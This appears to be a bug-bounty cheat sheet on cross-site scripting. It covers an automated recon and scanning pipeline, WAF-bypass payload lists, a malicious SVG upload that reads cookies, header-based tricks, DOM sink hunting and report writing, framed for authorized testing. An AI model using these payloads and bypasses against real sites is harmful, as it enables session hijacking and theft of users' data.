# XSS MASTER CLASS SHEET
*LoganSec, Bug Bounty Reference | April 2026*

---

## THE THREE TYPES (QUICK REFERENCE)

| Type | Where it lives | Persists? | Severity ceiling |
|---|---|---|---|
| **Reflected** | HTTP request → response immediately | No | Medium-High |
| **Stored** | Saved to DB, rendered later for other users | Yes | Critical |
| **DOM** | JS reads from source (URL/cookie), writes to sink | No | High-Critical |

**DOM XSS key concept:** Vulnerable source → dangerous sink
- **Sources:** `window.location`, `document.URL`, `document.referrer`, `document.cookie`, `localStorage`
- **Sinks:** `innerHTML`, `document.write()`, `eval()`, `setTimeout()`, `src` attribute assignments

---

## THE AUTOMATION PIPELINE (Reflected + DOM)

```bash
# 1. Subdomain enum
subfinder -d target.com -o subs.txt
cat subs.txt | httpx -o live.txt

# 2. Endpoint collection
echo "target.com" | gau --threads 5 >> endpoints.txt
cat live.txt | katana -jc >> endpoints.txt

# 3. Deduplicate
cat endpoints.txt | uro >> endpoints_clean.txt

# 4. Filter XSS-likely parameters
cat endpoints_clean.txt | gf xss >> xss.txt

# 5. Check reflection
cat xss.txt | Gxss -p khXSS -o xss_reflected.txt

# 6. Automate exploitation
dalfox file xss_reflected.txt -o vulnerable.txt
```

**Tool roles:**
- `gau` — pulls URLs from Wayback Machine + Common Crawl
- `katana` — deep crawl with JS execution
- `uro` — deduplicates endpoints (collapses `?id=1` and `?id=2` into one)
- `gf xss` — filters endpoints with parameters likely vulnerable to XSS
- `Gxss` — tests which parameters actually reflect the probe in the response
- `dalfox` — automated XSS scanner, generates payloads

---

## HIDDEN PARAMETER DISCOVERY

When a page looks dead, the attack surface may be hidden in undocumented parameters.

```bash
# Arjun — fuzz for hidden GET/POST parameters
arjun -u https://target.com/endpoint.php -m GET -w params_wordlist.txt

# Param Miner (Burp extension) — passive discovery during manual browse
```

Workflow:
1. Find an interesting endpoint (non-200 or partial page)
2. Run Arjun against it
3. When a hidden parameter surfaces, test it for reflection
4. Proceed to bypass if 403 on payload injection

---

## WAF / FILTER BYPASS TECHNIQUES

When `<script>alert(1)</script>` returns 403, work through these in order:

### 1. Case Manipulation
```
<sCrIpT>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>
```
Blacklists matching lowercase `<script>` exactly will miss this.

### 2. Nested Tag Injection (Filter Strips, Not Blocks)
```
<scr<script>ipt>alert(1)</scr</script>ipt>
```
If the filter removes `<script>` once and outputs the remainder, the nested version reconstructs after stripping.

### 3. Alternative Tags (No `<script>` Required)
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
```

### 4. Encoding
```
URL encode:   %3Cscript%3Ealert(1)%3C%2Fscript%3E
Double encode: %253Cscript%253E
HTML entities: &lt;script&gt;alert(1)&lt;/script&gt;
Unicode:       \u003cscript\u003e
```

### 5. Break Out of JS Context (DOM XSS Pattern)
If the value lands inside a JS variable:
```javascript
var returnUrl = "INJECT_HERE";
```
Payload:
```
";alert(document.domain);//
'-alert(document.domain)-'
</script><script>alert(1)</script>
```

### 6. Multi-Payload Probe (Test Everything at Once)
```
"><img src=x onerror=alert(document.domain)>{{7*7}}'
```
This single probe tests: XSS (img tag), SSTI ({{7*7}}), SQLi (') simultaneously. Use it on every input field before deciding what's worth pursuing.

---

## SVG FILE UPLOAD XSS

**When to test:** Any file upload that accepts SVG, XML, or images.

**The malicious SVG:**
```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(0,0,255)" />
   <script type="text/javascript">
      alert(document.domain + " | " + document.cookie);
   </script>
</svg>
```

**Testing approach:**
1. Upload SVG, navigate directly to the uploaded file URL
2. If browser renders SVG inline (not downloads it) → XSS executes
3. If stored and rendered on other users' pages → Stored XSS, higher severity

**Why this works:** SVG is XML-based and can embed `<script>` tags. Many upload validators check MIME type or extension but not content.

**Variations to try if SVG is blocked:**
- Upload as `.svg` but with `Content-Type: image/jpeg` in the request
- Try `.svgz` (gzipped SVG)
- Try `<img src="data:image/svg+xml,<svg...>">` injections

---

## USER-AGENT / HEADER-BASED XSS

**The technique:** Some apps gate content or render different code paths based on User-Agent. Switching to a bot UA (like `Mediapartners-Google`) may expose a different application entirely.

**Discovery workflow:**
1. Check `robots.txt` — disallowed paths AND `User-agent:` entries reveal what UAs the app responds to
2. Notable bot UAs to try:
   ```
   Mediapartners-Google
   Googlebot
   bingbot
   DuckDuckBot
   facebookexternalhit
   Twitterbot
   LinkedInBot
   ```
3. In Burp: Proxy → Options → Match and Replace → replace User-Agent header globally
4. Browse the app — watch for new pages, different responses, previously 403'd paths

**Why it works:** Some apps serve different JS to crawlers for SEO or ad rendering purposes. That JS often lacks the same sanitization as the user-facing code. URL path values get written to the DOM via `innerHTML` without encoding.

**Burp Match & Replace setup:**
- Type: Request header
- Match: `User-Agent: .*`
- Replace: `User-Agent: Mediapartners-Google`

---

## STORED XSS — WHERE TO LOOK

Every input that gets **saved and displayed to another user** is a stored XSS candidate:
- Username, display name, bio, profile fields
- Organization name, address, company name
- File names (upload filename displayed in UI)
- Comment fields, message bodies
- Support ticket titles/descriptions
- Product names, review text
- Notification messages you can control

**Bypass check on each field:** If one input blocks your payload, try others on the same form. Developers often protect the "obvious" field (username) but miss others (organization name, address line 2).

---

## DOM XSS — SOURCE/SINK HUNTING

**In Burp or DevTools:**

Search JS files for dangerous sinks:
```bash
grep -r "innerHTML\|document.write\|eval(\|setTimeout(\|setInterval(" --include="*.js"
```

Then trace back: what data feeds into that sink? Is any of it attacker-controllable?

**Common vulnerable patterns:**
```javascript
// Pattern 1: URL param → document.write
var urlParams = new URLSearchParams(window.location.search);
document.write(urlParams.get('param'));  // No encoding → DOM XSS

// Pattern 2: Hash → innerHTML
document.getElementById("el").innerHTML = location.hash.slice(1);

// Pattern 3: Stored in JS variable from URL
var returnUrl = "<?php echo $_GET['redirect']; ?>";  // Break out with ";alert(1);//
```

---

## IMPACT FRAMING FOR XSS

**The chain that turns Medium into Critical:**

| XSS Type | Cookie Flags | Impact |
|---|---|---|
| Reflected | `HttpOnly` not set | Session hijack → ATO |
| Stored | `HttpOnly` not set | Mass ATO of all users who view page |
| Any | `HttpOnly` set | Keylogging, form exfil, DOM manipulation, phishing overlay, CSRF bypass |

**Even with HttpOnly cookies, XSS can:**
- Steal form data (passwords typed after XSS fires)
- Exfiltrate visible page content (PII, tokens, keys in DOM)
- Make authenticated API requests on behalf of victim (CSRF bypass)
- Redirect to phishing page
- Capture 2FA codes from the DOM

**The report frame:** Don't just say "XSS exists." Say: "An attacker who delivers this link to an authenticated user gains full control of their session, including [specific action] on [specific endpoint]."

---

## SCOPE EXPANSION — REPLICATE ACROSS SUBDOMAINS

When you find XSS on one subdomain:
1. Identify if the vulnerable path/parameter pattern exists on sibling subdomains
2. Use `ffuf` to test the same path across all live subdomains:
```bash
ffuf -u "https://FUZZ.target.com/vulnerable/path?param=PAYLOAD" \
  -w subdomains.txt -c -v
```
3. **Report as one vulnerability** — triagers typically consolidate same-root findings. Don't submit 4 separate reports for the same pattern.

---

## THE XSS CHECKLIST

**Discovery**
- [ ] Automated pipeline run (gau + katana → gf xss → Gxss → dalfox)
- [ ] Arjun run on all interesting endpoints (hidden parameter discovery)
- [ ] robots.txt checked for User-Agent entries
- [ ] JS files grepped for dangerous sinks (innerHTML, document.write, eval)
- [ ] File upload features identified

**Manual Testing**
- [ ] Multi-probe payload on every input field: `"><img src=x onerror=alert(domain)>{{7*7}}'`
- [ ] All input fields on a form tested (not just the "obvious" one)
- [ ] Broken out of JS string context where values land in JS variables
- [ ] HTTP headers tested (User-Agent, Referer, X-Forwarded-For)
- [ ] Cookie values tested
- [ ] SVG upload attempted if file upload present

**Bypass Attempts (if 403 or filtered)**
- [ ] Case manipulation (`<sCrIpT>`)
- [ ] Nested tags (`<scr<script>ipt>`)
- [ ] Alternative event handlers (`onerror`, `onload`, `onfocus`, `ontoggle`)
- [ ] Encoding (URL, double-URL, HTML entities)
- [ ] Breaking out of string context if in JS variable
- [ ] Content-Type switching on file uploads

**Impact Verification**
- [ ] `document.cookie` accessible? (HttpOnly check)
- [ ] What page is this on — who sees it? (stored XSS reach)
- [ ] Can you exfil something specific from the DOM?
- [ ] Sibling subdomains tested for same pattern

**Documentation**
- [ ] Screenshot of payload executing with domain shown (`document.domain`)
- [ ] Screenshot of cookie exfil attempt (even if HttpOnly blocks it — shows intent)
- [ ] PoC URL or request ready for report
- [ ] Impact stated as concrete attacker action, not "could steal cookies"

---

## REPORT STRUCTURE

**Title format:**
`[Stored/Reflected/DOM] XSS in [Feature] Allows [Concrete Impact] — [Scope if notable]`

**Severity anchors:**
- Reflected, no ATO possible → Medium
- Reflected + session hijack → High
- Stored on low-traffic page → High
- Stored on high-traffic/admin-visible page → Critical
- DOM XSS in SPAs with sensitive data → High-Critical

**What makes a report get paid:**
1. Show what the payload executes in (`document.domain`, `document.cookie`)
2. State who the victim is (any user, admin, specific role)
3. State the concrete impact (ATO, data exfil, phishing — not just "alert box")
4. Show bypass steps if a WAF was involved (adds uniqueness)
5. PoC link or request that reproduces it in one step

---

## FALSE POSITIVE TRAPS

- **Self-XSS only** — if the payload only fires in your own browser and cannot be delivered to another user (no URL parameter, no stored path), it's not reportable
- **Alert-only PoC with HttpOnly cookies** — triagers know `alert(document.cookie)` showing blank/session means HttpOnly is set. Escalate: show what you *can* exfil from the DOM before reporting
- **Out-of-scope subdomains** — always check scope before chasing. The User-Agent technique finding in this article was not accepted because the subdomain was OOS

---

*Reference: Khaledyassen, "How I Found Multiple XSS Vulnerabilities Using Unknown Techniques" (Mar 2024)*
